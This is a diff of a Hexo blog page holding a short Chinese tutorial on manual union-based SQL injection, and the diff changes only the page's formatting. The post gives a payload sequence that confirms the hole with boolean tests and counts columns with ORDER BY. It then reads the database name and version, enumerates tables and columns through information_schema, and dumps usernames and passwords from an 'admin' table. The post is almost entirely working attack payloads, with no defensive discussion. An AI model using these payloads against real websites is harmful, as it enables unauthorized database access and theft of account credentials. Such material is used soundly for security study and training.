@@ -7,15 +7,15 @@
   
   <title>sql注入简单流程 | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="#EASY ##第一步，判断是否存在sql注入漏洞 ###?id&#x3D;1 and 1&#x3D;1——–页面返回正常 ###?id&#x3D;1 and 1&#x3D;2——–页面返回不正常，初步判断这里 可能 存在一个注入漏洞 ##第二步:判断字段数 ###?id&#x3D;1 and 1&#x3D;1 order by 1  回车——-页面正常 ###?id&#x3D;1 and 1&#x3D;1 order by 2  回车——-页面正常 ###?id&#x3D;1 and">
+  <meta name="description" content="EASY第一步，判断是否存在sql注入漏洞?id&#x3D;1 and 1&#x3D;1——–页面返回正常 ?id&#x3D;1 and 1&#x3D;2——–页面返回不正常，初步判断这里 可能 存在一个注入漏洞 第二步:判断字段数?id&#x3D;1 and 1&#x3D;1 order by 1  回车——-页面正常 ?id&#x3D;1 and 1&#x3D;1 order by 2  回车——-页面正常 ?id&#x3D;1 and 1&#x3D;1 order by 3  回车——-页">
 <meta property="og:type" content="article">
 <meta property="og:title" content="sql注入简单流程">
 <meta property="og:url" content="http://example.com/2020/09/24/sql-1/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="#EASY ##第一步，判断是否存在sql注入漏洞 ###?id&#x3D;1 and 1&#x3D;1——–页面返回正常 ###?id&#x3D;1 and 1&#x3D;2——–页面返回不正常，初步判断这里 可能 存在一个注入漏洞 ##第二步:判断字段数 ###?id&#x3D;1 and 1&#x3D;1 order by 1  回车——-页面正常 ###?id&#x3D;1 and 1&#x3D;1 order by 2  回车——-页面正常 ###?id&#x3D;1 and">
+<meta property="og:description" content="EASY第一步，判断是否存在sql注入漏洞?id&#x3D;1 and 1&#x3D;1——–页面返回正常 ?id&#x3D;1 and 1&#x3D;2——–页面返回不正常，初步判断这里 可能 存在一个注入漏洞 第二步:判断字段数?id&#x3D;1 and 1&#x3D;1 order by 1  回车——-页面正常 ?id&#x3D;1 and 1&#x3D;1 order by 2  回车——-页面正常 ?id&#x3D;1 and 1&#x3D;1 order by 3  回车——-页">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2020-09-24T14:32:50.000Z">
-<meta property="article:modified_time" content="2020-09-24T14:48:27.052Z">
+<meta property="article:modified_time" content="2020-09-24T14:51:45.590Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
   
@@ -88,30 +88,20 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>#EASY</p>
-<p>##<strong>第一步，判断是否存在sql注入漏洞</strong></p>
-<p>###?id=1 and 1=1——–页面返回正常</p>
-<p>###?id=1 and 1=2——–页面返回不正常，初步判断这里 可能 存在一个注入漏洞</p>
-<p>##<strong>第二步:判断字段数</strong></p>
-<p>###?id=1 and 1=1 order by 1  回车——-页面正常</p>
-<p>###?id=1 and 1=1 order by 2  回车——-页面正常</p>
-<p>###?id=1 and 1=1 order by 3  回车——-页面不正常</p>
-<p>##<strong>第三步：判断回显点</strong></p>
-<p>###?id=1 and 1=2 union select 1,2——页面出现了  2  ，说明我们可以在数字  2  处显示我们想要的内容</p>
-<p>##<strong>第四步:查询相关内容</strong></p>
-<p>###查询当前数据库名</p>
-<p>###?id=1 and 1=2 union select 1,database() </p>
-<p>###查询当前数据库版本</p>
-<p>###?id=1 and 1=2 union select 1,version() </p>
-<p>###查询当前数据库 表名</p>
-<p>###?id=1 and 1=2 union select 1,table_name from information_schema.tables where table_schema=database() limit 0,1</p>
-<p>###查询字段名</p>
-<p>###?id=1 and 1=2 union select 1,column_name from information_schema.columns where table_schema=database() and table_name=’admin’ limit 0,1 </p>
-<p>###?id=1 and 1=2 union select 1,column_name from information_schema.columns where table_schema=database() and table_name=’admin’ limit 2,1————查出 admin 表里 有  id  username  password  三个字段</p>
-<p>###查询字段内容</p>
-<p>###?id=1 and 1=2 union select 1,username from admin  limit 0,1</p>
-<p>###?id=1 and 1=2 union select 1,password from admin  limit 1,1</p>
-<p>###?id=1 and 1=2 union select 1,password from admin  limit 0,1</p>
+        <h1 id="EASY"><a href="#EASY" class="headerlink" title="EASY"></a>EASY</h1><h2 id="第一步，判断是否存在sql注入漏洞"><a href="#第一步，判断是否存在sql注入漏洞" class="headerlink" title="第一步，判断是否存在sql注入漏洞"></a><strong>第一步，判断是否存在sql注入漏洞</strong></h2><p>?id=1 and 1=1——–页面返回正常</p>
+<p>?id=1 and 1=2——–页面返回不正常，初步判断这里 可能 存在一个注入漏洞</p>
+<h2 id="第二步-判断字段数"><a href="#第二步-判断字段数" class="headerlink" title="第二步:判断字段数"></a><strong>第二步:判断字段数</strong></h2><p>?id=1 and 1=1 order by 1  回车——-页面正常</p>
+<p>?id=1 and 1=1 order by 2  回车——-页面正常</p>
+<p>?id=1 and 1=1 order by 3  回车——-页面不正常</p>
+<h2 id="第三步：判断回显点"><a href="#第三步：判断回显点" class="headerlink" title="第三步：判断回显点"></a><strong>第三步：判断回显点</strong></h2><p>?id=1 and 1=2 union select 1,2——页面出现了  2  ，说明我们可以在数字  2  处显示我们想要的内容</p>
+<h2 id="第四步-查询相关内容"><a href="#第四步-查询相关内容" class="headerlink" title="第四步:查询相关内容"></a><strong>第四步:查询相关内容</strong></h2><h3 id="查询当前数据库名"><a href="#查询当前数据库名" class="headerlink" title="查询当前数据库名"></a>查询当前数据库名</h3><p>?id=1 and 1=2 union select 1,database() </p>
+<h3 id="查询当前数据库版本"><a href="#查询当前数据库版本" class="headerlink" title="查询当前数据库版本"></a>查询当前数据库版本</h3><p>?id=1 and 1=2 union select 1,version() </p>
+<h3 id="查询当前数据库-表名"><a href="#查询当前数据库-表名" class="headerlink" title="查询当前数据库 表名"></a>查询当前数据库 表名</h3><p>?id=1 and 1=2 union select 1,table_name from information_schema.tables where table_schema=database() limit 0,1</p>
+<h3 id="查询字段名"><a href="#查询字段名" class="headerlink" title="查询字段名"></a>查询字段名</h3><p>?id=1 and 1=2 union select 1,column_name from information_schema.columns where table_schema=database() and table_name=’admin’ limit 0,1 </p>
+<p>?id=1 and 1=2 union select 1,column_name from information_schema.columns where table_schema=database() and table_name=’admin’ limit 2,1————查出 admin 表里 有  id  username  password  三个字段</p>
+<h3 id="查询字段内容"><a href="#查询字段内容" class="headerlink" title="查询字段内容"></a>查询字段内容</h3><p>?id=1 and 1=2 union select 1,username from admin  limit 0,1</p>
+<p>?id=1 and 1=2 union select 1,password from admin  limit 1,1</p>
+<p>?id=1 and 1=2 union select 1,password from admin  limit 0,1</p>
 
       
     </div>
